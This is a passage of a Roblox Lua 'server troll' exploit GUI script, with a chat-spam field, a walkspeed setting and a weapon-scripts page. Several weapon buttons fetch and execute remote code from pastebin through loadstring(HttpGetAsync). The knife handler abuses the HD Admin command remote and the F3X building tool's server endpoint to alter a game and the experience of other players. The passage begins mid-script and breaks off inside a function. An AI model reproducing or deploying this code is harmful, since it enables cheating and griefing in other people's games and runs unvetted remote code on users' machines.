local epikservertrollgui = Instance.new("ScreenGui")
Title_11.BorderColor3 = Color3.new(1, 0, 0)
Title_11.BorderSizePixel = 3
Title_11.Size = UDim2.new(1, 0, 0, 30)
Title_11.Font = Enum.Font.SourceSansBold
Title_11.FontSize = Enum.FontSize.Size14
Title_11.Text = "Billboard Gui Color"
Title_11.TextColor3 = Color3.new(1, 1, 1)
Title_11.TextSize = 14
Title_11.TextWrapped = true

TextBox2.Name = "TextBox2"
TextBox2.Parent = BillboardGuiColor
TextBox2.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox2.BorderColor3 = Color3.new(1, 0, 0)
TextBox2.BorderSizePixel = 3
TextBox2.Position = UDim2.new(0, 50, 0.5, 0)
TextBox2.Size = UDim2.new(0, 50, 0.5, -1)
TextBox2.Font = Enum.Font.SourceSans
TextBox2.FontSize = Enum.FontSize.Size14
TextBox2.Text = "255"
TextBox2.TextColor3 = Color3.new(1, 1, 1)
TextBox2.TextSize = 14

TextBox1.Name = "TextBox1"
TextBox1.Parent = BillboardGuiColor
TextBox1.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox1.BorderColor3 = Color3.new(1, 0, 0)
TextBox1.BorderSizePixel = 3
TextBox1.Position = UDim2.new(0, 0, 0.5, 0)
TextBox1.Size = UDim2.new(0, 50, 0.5, -1)
TextBox1.Font = Enum.Font.SourceSans
TextBox1.FontSize = Enum.FontSize.Size14
TextBox1.Text = "0"
TextBox1.TextColor3 = Color3.new(1, 1, 1)
TextBox1.TextSize = 14

TextBox3.Name = "TextBox3"
TextBox3.Parent = BillboardGuiColor
TextBox3.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox3.BorderColor3 = Color3.new(1, 0, 0)
TextBox3.BorderSizePixel = 3
TextBox3.Position = UDim2.new(0, 100, 0.5, 0)
TextBox3.Size = UDim2.new(0, 50, 0.5, -1)
TextBox3.Font = Enum.Font.SourceSans
TextBox3.FontSize = Enum.FontSize.Size14
TextBox3.Text = "0"
TextBox3.TextColor3 = Color3.new(1, 1, 1)
TextBox3.TextSize = 14

PageLabel_2.Name = "PageLabel"
PageLabel_2.Parent = Page2
PageLabel_2.BackgroundColor3 = Color3.new(0, 0, 0)
PageLabel_2.BorderColor3 = Color3.new(1, 0, 0)
PageLabel_2.BorderSizePixel = 3
PageLabel_2.Position = UDim2.new(0, 0, 1, -53)
PageLabel_2.Size = UDim2.new(1, 0, 0, 30)
PageLabel_2.Font = Enum.Font.SourceSans
PageLabel_2.FontSize = Enum.FontSize.Size18
PageLabel_2.Text = "Page 2"
PageLabel_2.TextColor3 = Color3.new(1, 1, 1)
PageLabel_2.TextSize = 18
PageLabel_2.TextWrapped = true

AntiRobloxianRange.Name = "Anti Robloxian Range"
AntiRobloxianRange.Parent = Page2
AntiRobloxianRange.BackgroundColor3 = Color3.new(0, 0, 0)
AntiRobloxianRange.BorderColor3 = Color3.new(1, 0, 0)
AntiRobloxianRange.BorderSizePixel = 3
AntiRobloxianRange.Position = UDim2.new(0, 0, 0, 66)
AntiRobloxianRange.Size = UDim2.new(0.5, 0, 0, 66)

Title_12.Name = "Title"
Title_12.Parent = AntiRobloxianRange
Title_12.BackgroundColor3 = Color3.new(0, 0, 0)
Title_12.BorderColor3 = Color3.new(1, 0, 0)
Title_12.BorderSizePixel = 3
Title_12.Size = UDim2.new(1, 0, 0, 30)
Title_12.Font = Enum.Font.SourceSansBold
Title_12.FontSize = Enum.FontSize.Size14
Title_12.Text = "Anti Robloxian Range"
Title_12.TextColor3 = Color3.new(1, 1, 1)
Title_12.TextSize = 14
Title_12.TextWrapped = true

TextBox1_2.Name = "TextBox1"
TextBox1_2.Parent = AntiRobloxianRange
TextBox1_2.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox1_2.BorderColor3 = Color3.new(1, 0, 0)
TextBox1_2.BorderSizePixel = 3
TextBox1_2.Position = UDim2.new(0, 0, 0.5, 0)
TextBox1_2.Size = UDim2.new(1, 0, 0.5, -1)
TextBox1_2.Font = Enum.Font.SourceSans
TextBox1_2.FontSize = Enum.FontSize.Size14
TextBox1_2.Text = "12"
TextBox1_2.TextColor3 = Color3.new(1, 1, 1)
TextBox1_2.TextSize = 14

ChatSpamText.Name = "Chat Spam Text"
ChatSpamText.Parent = Page2
ChatSpamText.BackgroundColor3 = Color3.new(0, 0, 0)
ChatSpamText.BorderColor3 = Color3.new(1, 0, 0)
ChatSpamText.BorderSizePixel = 3
ChatSpamText.Position = UDim2.new(0.5, 3, 0, 66)
ChatSpamText.Size = UDim2.new(0.5, -3, 0, 66)

Title_13.Name = "Title"
Title_13.Parent = ChatSpamText
Title_13.BackgroundColor3 = Color3.new(0, 0, 0)
Title_13.BorderColor3 = Color3.new(1, 0, 0)
Title_13.BorderSizePixel = 3
Title_13.Size = UDim2.new(1, 0, 0, 30)
Title_13.Font = Enum.Font.SourceSansBold
Title_13.FontSize = Enum.FontSize.Size14
Title_13.Text = "Chat Spam Text"
Title_13.TextColor3 = Color3.new(1, 1, 1)
Title_13.TextSize = 14
Title_13.TextWrapped = true

TextBox_7.Parent = ChatSpamText
TextBox_7.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox_7.BorderColor3 = Color3.new(1, 0, 0)
TextBox_7.BorderSizePixel = 3
TextBox_7.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_7.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_7.Font = Enum.Font.SourceSans
TextBox_7.FontSize = Enum.FontSize.Size14
TextBox_7.Text = "Join team c00lkidd!"
TextBox_7.TextColor3 = Color3.new(1, 1, 1)
TextBox_7.TextSize = 14

LeaderstatName.Name = "Leaderstat Name"
LeaderstatName.Parent = Page2
LeaderstatName.BackgroundColor3 = Color3.new(0, 0, 0)
LeaderstatName.BorderColor3 = Color3.new(1, 0, 0)
LeaderstatName.BorderSizePixel = 3
LeaderstatName.Position = UDim2.new(0, 0, 0, 132)
LeaderstatName.Size = UDim2.new(0.5, 0, 0, 66)

Title_14.Name = "Title"
Title_14.Parent = LeaderstatName
Title_14.BackgroundColor3 = Color3.new(0, 0, 0)
Title_14.BorderColor3 = Color3.new(1, 0, 0)
Title_14.BorderSizePixel = 3
Title_14.Size = UDim2.new(1, 0, 0, 30)
Title_14.Font = Enum.Font.SourceSansBold
Title_14.FontSize = Enum.FontSize.Size14
Title_14.Text = "Leaderstat Name"
Title_14.TextColor3 = Color3.new(1, 1, 1)
Title_14.TextSize = 14
Title_14.TextWrapped = true

TextBox_8.Parent = LeaderstatName
TextBox_8.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox_8.BorderColor3 = Color3.new(1, 0, 0)
TextBox_8.BorderSizePixel = 3
TextBox_8.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_8.Size = UDim2.new(1, 0, 0.5, -1)
TextBox_8.Font = Enum.Font.SourceSans
TextBox_8.FontSize = Enum.FontSize.Size14
TextBox_8.Text = "KOs"
TextBox_8.TextColor3 = Color3.new(1, 1, 1)
TextBox_8.TextSize = 14

LeaderstatAmount.Name = "Leaderstat Amount"
LeaderstatAmount.Parent = Page2
LeaderstatAmount.BackgroundColor3 = Color3.new(0, 0, 0)
LeaderstatAmount.BorderColor3 = Color3.new(1, 0, 0)
LeaderstatAmount.BorderSizePixel = 3
LeaderstatAmount.Position = UDim2.new(0.5, 3, 0, 132)
LeaderstatAmount.Size = UDim2.new(0.5, -3, 0, 66)

Title_15.Name = "Title"
Title_15.Parent = LeaderstatAmount
Title_15.BackgroundColor3 = Color3.new(0, 0, 0)
Title_15.BorderColor3 = Color3.new(1, 0, 0)
Title_15.BorderSizePixel = 3
Title_15.Size = UDim2.new(1, 0, 0, 30)
Title_15.Font = Enum.Font.SourceSansBold
Title_15.FontSize = Enum.FontSize.Size14
Title_15.Text = "Leaderstat Amount"
Title_15.TextColor3 = Color3.new(1, 1, 1)
Title_15.TextSize = 14
Title_15.TextWrapped = true

TextBox_9.Parent = LeaderstatAmount
TextBox_9.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox_9.BorderColor3 = Color3.new(1, 0, 0)
TextBox_9.BorderSizePixel = 3
TextBox_9.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_9.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_9.Font = Enum.Font.SourceSans
TextBox_9.FontSize = Enum.FontSize.Size14
TextBox_9.Text = "1"
TextBox_9.TextColor3 = Color3.new(1, 1, 1)
TextBox_9.TextSize = 14

WalkspeedAmount.Name = "Walkspeed Amount"
WalkspeedAmount.Parent = Page2
WalkspeedAmount.BackgroundColor3 = Color3.new(0, 0, 0)
WalkspeedAmount.BorderColor3 = Color3.new(1, 0, 0)
WalkspeedAmount.BorderSizePixel = 3
WalkspeedAmount.Position = UDim2.new(0, 0, 0, 198)
WalkspeedAmount.Size = UDim2.new(0.5, 0, 0, 66)

Title_16.Name = "Title"
Title_16.Parent = WalkspeedAmount
Title_16.BackgroundColor3 = Color3.new(0, 0, 0)
Title_16.BorderColor3 = Color3.new(1, 0, 0)
Title_16.BorderSizePixel = 3
Title_16.Size = UDim2.new(1, 0, 0, 30)
Title_16.Font = Enum.Font.SourceSansBold
Title_16.FontSize = Enum.FontSize.Size14
Title_16.Text = "Walkspeed Amount"
Title_16.TextColor3 = Color3.new(1, 1, 1)
Title_16.TextSize = 14
Title_16.TextWrapped = true

TextBox_10.Parent = WalkspeedAmount
TextBox_10.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox_10.BorderColor3 = Color3.new(1, 0, 0)
TextBox_10.BorderSizePixel = 3
TextBox_10.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_10.Size = UDim2.new(1, 0, 0.5, -3)
TextBox_10.Font = Enum.Font.SourceSans
TextBox_10.FontSize = Enum.FontSize.Size14
TextBox_10.Text = "50"
TextBox_10.TextColor3 = Color3.new(1, 1, 1)
TextBox_10.TextSize = 14

NameBox.Name = "NameBox"
NameBox.Parent = Page2
NameBox.BackgroundColor3 = Color3.new(0, 0, 0)
NameBox.BorderColor3 = Color3.new(1, 0, 0)
NameBox.BorderSizePixel = 3
NameBox.Position = UDim2.new(0.5, 3, 0, 0)
NameBox.Size = UDim2.new(0.5, -3, 0, 66)

Title_17.Name = "Title"
Title_17.Parent = NameBox
Title_17.BackgroundColor3 = Color3.new(0, 0, 0)
Title_17.BorderColor3 = Color3.new(1, 0, 0)
Title_17.BorderSizePixel = 3
Title_17.Size = UDim2.new(1, 0, 0, 30)
Title_17.Font = Enum.Font.SourceSansBold
Title_17.FontSize = Enum.FontSize.Size14
Title_17.Text = "Name"
Title_17.TextColor3 = Color3.new(1, 1, 1)
Title_17.TextSize = 14
Title_17.TextWrapped = true

TextBox_11.Parent = NameBox
TextBox_11.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox_11.BorderColor3 = Color3.new(1, 0, 0)
TextBox_11.BorderSizePixel = 3
TextBox_11.Position = UDim2.new(0, 0, 0.5, 0)
TextBox_11.Size = UDim2.new(1, 0, 0.5, 0)
TextBox_11.Font = Enum.Font.SourceSans
TextBox_11.FontSize = Enum.FontSize.Size14
TextBox_11.Text = "God"
TextBox_11.TextColor3 = Color3.new(1, 1, 1)
TextBox_11.TextSize = 14

Page2_2.Name = "Page2"
Page2_2.Parent = Frame
Page2_2.BackgroundColor3 = Color3.new(0, 0, 0)
Page2_2.BorderColor3 = Color3.new(1, 0, 0)
Page2_2.BorderSizePixel = 3
Page2_2.Position = UDim2.new(0, 0, 0, 83)
Page2_2.Size = UDim2.new(1, 0, 1, -106)
Page2_2.Visible = false
Page2_2.ZIndex = 2

WeaponScripts.Name = "Weapon Scripts"
WeaponScripts.Parent = Page2_2
WeaponScripts.BackgroundColor3 = Color3.new(0, 0, 0)
WeaponScripts.BorderColor3 = Color3.new(1, 0, 0)
WeaponScripts.BorderSizePixel = 3
WeaponScripts.Size = UDim2.new(0.5, 0, 1, 0)
WeaponScripts.ZIndex = 2

xBow.Name = "xBow"
xBow.Parent = WeaponScripts
xBow.BackgroundColor3 = Color3.new(0, 0, 0)
xBow.BorderColor3 = Color3.new(1, 0, 0)
xBow.BorderSizePixel = 3
xBow.Position = UDim2.new(0, 0, 0, 33)
xBow.Size = UDim2.new(0.5, 0, 0, 30)
xBow.ZIndex = 2
xBow.Font = Enum.Font.SourceSans
xBow.FontSize = Enum.FontSize.Size14
xBow.Text = "xBow"
xBow.TextColor3 = Color3.new(1, 1, 1)
xBow.TextSize = 14
xBow.MouseButton1Click:Connect(function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/UpexViXw"))()
end)

Title_18.Name = "Title"
Title_18.Parent = WeaponScripts
Title_18.BackgroundColor3 = Color3.new(0, 0, 0)
Title_18.BorderColor3 = Color3.new(1, 0, 0)
Title_18.BorderSizePixel = 3
Title_18.Size = UDim2.new(1, 0, 0, 30)
Title_18.ZIndex = 2
Title_18.Font = Enum.Font.SourceSansBold
Title_18.FontSize = Enum.FontSize.Size14
Title_18.Text = "Weapon Scripts"
Title_18.TextColor3 = Color3.new(1, 1, 1)
Title_18.TextSize = 14
Title_18.TextWrapped = true

Drage.Name = "Drage"
Drage.Parent = WeaponScripts
Drage.BackgroundColor3 = Color3.new(0, 0, 0)
Drage.BorderColor3 = Color3.new(1, 0, 0)
Drage.BorderSizePixel = 3
Drage.Position = UDim2.new(0, 0, 0, 66)
Drage.Size = UDim2.new(0.5, 0, 0, 30)
Drage.ZIndex = 2
Drage.Font = Enum.Font.SourceSans
Drage.FontSize = Enum.FontSize.Size14
Drage.Text = "Drage"
Drage.TextColor3 = Color3.new(1, 1, 1)
Drage.TextSize = 14
Drage.MouseButton1Click:Connect(function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AnkzsX0U"))()
end)

Eyelaser.Name = "Eyelaser"
Eyelaser.Parent = WeaponScripts
Eyelaser.BackgroundColor3 = Color3.new(0, 0, 0)
Eyelaser.BorderColor3 = Color3.new(1, 0, 0)
Eyelaser.BorderSizePixel = 3
Eyelaser.Position = UDim2.new(0, 0, 0, 99)
Eyelaser.Size = UDim2.new(0.5, 0, 0, 30)
Eyelaser.ZIndex = 2
Eyelaser.Font = Enum.Font.SourceSans
Eyelaser.FontSize = Enum.FontSize.Size14
Eyelaser.Text = "Eyelaser"
Eyelaser.TextColor3 = Color3.new(1, 1, 1)
Eyelaser.TextSize = 14
Eyelaser.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local backpack = player:WaitForChild("Backpack")

	local toolModel = game:GetObjects("rbxassetid://142007482")[1]

	toolModel.Parent = backpack

end)

Wand.Name = "Wand"
Wand.Parent = WeaponScripts
Wand.BackgroundColor3 = Color3.new(0, 0, 0)
Wand.BorderColor3 = Color3.new(1, 0, 0)
Wand.BorderSizePixel = 3
Wand.Position = UDim2.new(0.5, 3, 0, 33)
Wand.Size = UDim2.new(0.5, -3, 0, 30)
Wand.ZIndex = 2
Wand.Font = Enum.Font.SourceSans
Wand.FontSize = Enum.FontSize.Size14
Wand.Text = "Wand"
Wand.TextColor3 = Color3.new(1, 1, 1)
Wand.TextSize = 14
Wand.MouseButton1Click:Connect(function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Zgvsnh0R"))()
end)

DualBlades.Name = "Dual Blades"
DualBlades.Parent = WeaponScripts
DualBlades.BackgroundColor3 = Color3.new(0, 0, 0)
DualBlades.BorderColor3 = Color3.new(1, 0, 0)
DualBlades.BorderSizePixel = 3
DualBlades.Position = UDim2.new(0.5, 3, 0, 66)
DualBlades.Size = UDim2.new(0.5, -3, 0, 30)
DualBlades.ZIndex = 2
DualBlades.Font = Enum.Font.SourceSans
DualBlades.FontSize = Enum.FontSize.Size14
DualBlades.Text = "Dual Blades"
DualBlades.TextColor3 = Color3.new(1, 1, 1)
DualBlades.TextSize = 14
DualBlades.MouseButton1Click:Connect(function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Zgvsnh0R"))()
end)

Knife.Name = "Knife"
Knife.Parent = WeaponScripts
Knife.BackgroundColor3 = Color3.new(0, 0, 0)
Knife.BorderColor3 = Color3.new(1, 0, 0)
Knife.BorderSizePixel = 3
Knife.Position = UDim2.new(0.5, 3, 0, 99)
Knife.Size = UDim2.new(0.5, -3, 0, 30)
Knife.ZIndex = 2
Knife.Font = Enum.Font.SourceSans
Knife.FontSize = Enum.FontSize.Size14
Knife.Text = "Grab Knife"
Knife.TextColor3 = Color3.new(1, 1, 1)
Knife.TextSize = 14
Knife.MouseButton1Click:Connect(function()
-- knife f3x 

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification


local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
ready = false

local function notify(msg)
    local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
    if not MainGUI then
        MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        MainGUI.Name = "MainGUI"
    end

    coroutine.wrap(function()
        for _, v in pairs(MainGUI:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end

        local TextLabel = Instance.new("TextLabel")
        local Frame = Instance.new("Frame")

        TextLabel.Parent = MainGUI
        TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
        TextLabel.BorderSizePixel = 0
        TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
        TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
        TextLabel.Font = Enum.Font.SourceSans
        TextLabel.TextColor3 = Color3.new(1, 1, 1)
        TextLabel.TextSize = 35
        TextLabel.TextScaled = true
        TextLabel.TextYAlignment = Enum.TextYAlignment.Center
        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
        TextLabel.Text = ""
        TextLabel.BackgroundTransparency = 1

        Frame.Parent = TextLabel
        Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        Frame.BorderSizePixel = 0
        Frame.Transparency = 1
        Frame.Position = UDim2.new(0, 0, 1, 0)
        Frame.Size = UDim2.new(1, 0, 0, 5)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
            TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
            Frame.Transparency = Frame.Transparency - 0.1
            task.wait()
        end

        msg = "  " .. msg
        for i = 1, #msg do
            TextLabel.Text = string.sub(msg, 1, i)
            task.wait()
        end

        task.wait(1)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
            TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
            Frame.Transparency = Frame.Transparency + 0.1
            task.wait()
        end
        TextLabel:Destroy()
    end)()
end


RequestCommand:InvokeServer(";hat me 18268136683")

yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
if yeah then
notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
task.wait(3)
notify("Press 'Z' to equip.")
elseif not yeah then
notify("LOL this game has no btools or f3x so this not gonna work here")
end

local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

local remote = tool.SyncAPI.ServerEndpoint

function _(args)
    remote:InvokeServer(unpack(args))
end
function SetCollision(part, boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end
    function SetLocked(part,boolean)
        local args = {
            [1] = "SetLocked",
            [2] = {
                [1] = part
            },
            [3] = boolean
        }
        _(args)
    end
function yerpp(E)
local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = E,
                ["DecorationType"] = "Sparkles",
                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
            } 
        } 
    }
    _(argsCreate)
    _(argsSync)
end

local knfe = character["Accessory (Knife McGrabbington III)"]

if knfe then
	local args = {
		"Remove",
		{
